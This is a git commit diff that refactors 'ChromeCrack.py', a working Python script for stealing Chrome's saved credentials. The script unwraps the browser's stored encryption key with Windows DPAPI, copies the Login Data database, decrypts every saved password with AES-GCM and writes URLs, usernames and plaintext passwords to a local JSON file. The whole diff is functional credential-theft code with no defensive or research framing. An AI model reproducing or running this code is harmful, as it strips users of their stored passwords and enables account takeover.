87dc1c366a06799b01aa2988bcd79a4a707dc9ef
Victor Asanache <victor.asanache@gmail.com>
2023-05-12 13:13:55 +0300

    Functional Decomp

--- Chrome/ChromeCrack.py
+++ Chrome/ChromeCrack.py
@@ -6,53 +6,64 @@ from Crypto.Cipher import AES
 import os
 import json
 
+encKeyPath = r"%s\AppData\Local\Google\Chrome\User Data\Local State"
+loginDataPath = r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 
-f = open(os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE'])))
-opened = f.read()
-db = json.loads(opened)
-secret = db["os_crypt"]["encrypted_key"]
+def getEncryptionKey(endKeyPath):
+    f = open(os.path.normpath(encKeyPath%(os.environ['USERPROFILE'])))
+    opened = f.read()
+    db = json.loads(opened)
+    secret = db["os_crypt"]["encrypted_key"]
 
-# thus we must decode the encryption key
-enc_key = base64.b64decode(secret)
-#print(enc_key)
-# the return is something which has been encoded using windows data protection api (seen from the dpapi line)
-# we remove the dpapi line
-enc_key = enc_key[5:] 
-# result is still need to be decrypted via the dpapi
-#print(enc_key)
-#the dpapi key is machine specific
-enc_key = win32crypt.CryptUnprotectData(enc_key, None,None,None,0)[1]
-
-
-#Chrome username & password file path
-path_login_db = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data"%(os.environ['USERPROFILE']))
-###### sometimes db can appear as locked, bellow is fix ############
-shutil.copy(path_login_db,'tempdata.db')
-#Connect to sqlite database
-conn = sqlite3.connect('tempdata.db')
-cursor = conn.cursor()
-#Select statement to retrieve info 
-curr = '{}'
-data = json.loads(curr)
-
-saveduser = ''
-savedpass = ''
-cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-for index,login in enumerate(cursor.fetchall()):
-    url = login[0]
-    passw = login[2]
+    # thus we must decode the encryption key
+    enc_key = base64.b64decode(secret)
+    # the return is something which has been encoded using windows data protection api (seen from the dpapi line)
+    # we remove the dpapi line
+    enc_key = enc_key[5:] 
+    # result is still need to be decrypted via the dpapi
+    #the dpapi key is machine specific
+    enc_key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
     
-    initialisation_vector = passw[3:15]
-    encrypted_password = passw[15:-16]
-    cipher = AES.new(enc_key, AES.MODE_GCM, initialisation_vector)
-    data[url] = {
-        'user': login[1],
-        'pass': cipher.decrypt(encrypted_password).decode()
-    }
-# close connection to db and remove the db made
-conn.close()
-os.remove('tempdata.db')
+    return enc_key
 
-with open('data.json', 'w') as f:
-    # Write the JSON data to the file
-    json.dump(data, f)
+def getAndDecryptLoginData(loginDataPath):
+    #Chrome username & password file path
+    path_login_db = os.path.normpath(loginDataPath%(os.environ['USERPROFILE']))
+    ###### sometimes db can appear as locked, bellow is fix ############
+    shutil.copy(path_login_db,'tempdata.db')
+    #Connect to sqlite database
+    conn = sqlite3.connect('tempdata.db')
+    cursor = conn.cursor()
+    #Select statement to retrieve info 
+    curr = '{}'
+    data = json.loads(curr)
+
+    return data, cursor, conn
+
+def buildJson():
+    enc_key = getEncryptionKey(encKeyPath)
+    data, cursor, conn = getAndDecryptLoginData(loginDataPath)
+
+    saveduser = ''
+    savedpass = ''
+    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+    for index,login in enumerate(cursor.fetchall()):
+        url = login[0]
+        passw = login[2]
+        
+        initialisation_vector = passw[3:15]
+        encrypted_password = passw[15:-16]
+        cipher = AES.new(enc_key, AES.MODE_GCM, initialisation_vector)
+        data[url] = {
+            'user': login[1],
+            'pass': cipher.decrypt(encrypted_password).decode()
+        }
+    # close connection to db and remove the db made
+    conn.close()
+    os.remove('tempdata.db')
+
+    with open('data.json', 'w') as f:
+        # Write the JSON data to the file
+        json.dump(data, f)
+
+buildJson()
